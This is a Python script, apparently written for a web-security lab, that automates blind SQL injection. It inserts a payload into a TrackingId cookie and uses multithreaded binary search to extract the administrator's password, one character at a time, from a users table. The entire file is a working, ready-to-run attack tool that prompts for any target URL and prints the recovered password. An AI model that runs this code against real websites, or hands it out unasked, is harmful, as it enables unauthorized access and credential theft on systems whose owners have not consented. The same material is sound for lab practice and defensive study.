import requests
import threading
import sys
import readline
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Constants ────────────────────────────────────────────
MAX_WORKERS    = 20   # Parallel threads
MAX_RETRIES    = 3    # Retry failed requests
TIMEOUT        = 10   # Request timeout seconds
PASSWORD_LEN   = 20   # Password length
ASCII_LOW      = 32   # Printable ASCII start
ASCII_HIGH     = 126  # Printable ASCII end

# ─── Shared State ─────────────────────────────────────────
password    = ['?'] * PASSWORD_LEN
lock        = threading.Lock()
found_count = 0

def get_input(prompt):
    """Get input with full keyboard support using readline"""
    try:
        return input(prompt)
    except EOFError:
        return ''

def fix_url(url):
    """Auto fix URL - add https:// if missing and trailing slash"""
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith('/'):
        url += '/'
    return url

def validate_url(url):
    """Validate URL format"""
    if not url:
        return False, "URL cannot be empty!"
    if ' ' in url:
        return False, "URL cannot contain spaces!"
    if '.' not in url:
        return False, "Invalid URL format! (e.g. abc123.example.net)"
    return True, ""

def validate_cookie(value, name):
    """Validate cookie is not empty"""
    if not value:
        return False, f"{name} cannot be empty!"
    if ' ' in value:
        return False, f"{name} cannot contain spaces!"
    return True, ""

def get_valid_input(prompt, validate_func, *args):
    """Keep asking until valid input is given"""
    while True:
        value = get_input(prompt).strip()
        is_valid, error = validate_func(value, *args)
        if is_valid:
            return value
        print(f"    [!] {error} Please try again.")

def test_connection(url):
    """Test if URL is reachable"""
    try:
        r = requests.get(url, timeout=TIMEOUT)
        return True, r.status_code
    except requests.exceptions.ConnectionError:
        return False, "Cannot connect - check URL"
    except requests.exceptions.Timeout:
        return False, "Connection timed out"
    except requests.exceptions.InvalidURL:
        return False, "Invalid URL format"
    except Exception as e:
        return False, str(e)

def send_request(session_obj, url, base_tracking_id, session_cookie, pos, operator, value):
    """Send single request with retry logic"""
    tracking_id = (
        f"{base_tracking_id}'+AND+"
        f"(SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+"
        f"WHERE+username='administrator'){operator}{value}--"
    )
    cookies = {
        "TrackingId": tracking_id,
        "session":    session_cookie
    }

    for attempt in range(MAX_RETRIES):
        try:
            r = session_obj.get(url, cookies=cookies, timeout=TIMEOUT)
            return "Welcome" in r.text
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                time.sleep(0.5 * (attempt + 1))  # Wait longer each retry
                continue
            return False
        except Exception:
            if attempt < MAX_RETRIES - 1:
                time.sleep(0.3)
                continue
            return False
    return False

def binary_search_char(session_obj, url, base_tracking_id, session_cookie, pos):
    """Find character at given position using binary search"""
    global found_count
    low, high = ASCII_LOW, ASCII_HIGH

    while low <= high:
        mid = (low + high) // 2

        if send_request(session_obj, url, base_tracking_id, session_cookie, pos, ">", mid):
            low = mid + 1
        elif send_request(session_obj, url, base_tracking_id, session_cookie, pos, "<", mid):
            high = mid - 1
        else:
            # Exact match found
            char = chr(mid)
            with lock:
                password[pos-1] = char
                found_count += 1
                progress = f"{found_count}/{PASSWORD_LEN}"
                print(f"[+] Position {pos:02d}: '{char}' | Progress: {progress} | {''.join(password)}")
            return pos, char

    # Not found
    with lock:
        print(f"[-] Position {pos:02d}: not found")
    return pos, None

def check_session_valid(session_obj, url, base_tracking_id, session_cookie):
    """Quick check if cookies are still valid"""
    try:
        r = session_obj.get(url, cookies={
            "TrackingId": base_tracking_id,
            "session": session_cookie
        }, timeout=TIMEOUT)
        # If we get redirected to login, session expired
        if "login" in r.url.lower():
            return False
        return True
    except:
        return False

def main():
    global found_count, password

    print("=" * 55)
    print("        Blind SQLi - Binary Search Attack")
    print("=" * 55)
    print()

    try:
        # ── Get and validate URL ──
        while True:
            url = get_valid_input("[*] URL        : ", validate_url)
            url = fix_url(url)
            print("[*] Testing connection...")
            ok, result = test_connection(url)
            if ok:
                print(f"[+] Connected! Status: {result}\n")
                break
            else:
                print(f"    [!] {result}")
                print("    [!] Please enter a valid URL.\n")

        # ── Get cookies ──
        tracking_id = get_valid_input("[*] TrackingId : ", validate_cookie, "TrackingId")
        session     = get_valid_input("[*] Session    : ", validate_cookie, "Session")

        # ── Validate session before starting ──
        print("\n[*] Validating cookies...")
        http_session = requests.Session()  # Reuse TCP connections = faster
        if not check_session_valid(http_session, url, tracking_id, session):
            print("[!] Warning: Session may be expired - results could be wrong!")
        else:
            print("[+] Cookies OK!\n")

        print(f"[*] Target   : {url}")
        print(f"[*] Threads  : {MAX_WORKERS}")
        print(f"[*] Retries  : {MAX_RETRIES} per request")
        print(f"[*] Starting attack...\n")

        # Reset state
        password    = ['?'] * PASSWORD_LEN
        found_count = 0
        start_time  = time.time()

        # ── ThreadPoolExecutor - more efficient than manual threads ──
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {
                executor.submit(
                    binary_search_char,
                    http_session, url, tracking_id, session, pos
                ): pos
                for pos in range(1, PASSWORD_LEN + 1)
            }

            # Process results as they complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pos = futures[future]
                    print(f"[-] Position {pos:02d} error: {e}")

        elapsed = time.time() - start_time

        # ── Final result ──
        print("\n" + "=" * 55)
        if '?' in password:
            print("[!] Warning: Some positions failed!")
            print("[!] Try again with fresh cookies.")
        print(f"[*] Final Password : {''.join(password)}")
        print(f"[*] Time Taken     : {elapsed:.2f} seconds")
        print("=" * 55)

    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user.")
        print(f"[*] Partial Password: {''.join(password)}")
        sys.exit(0)

if __name__ == "__main__":
    main()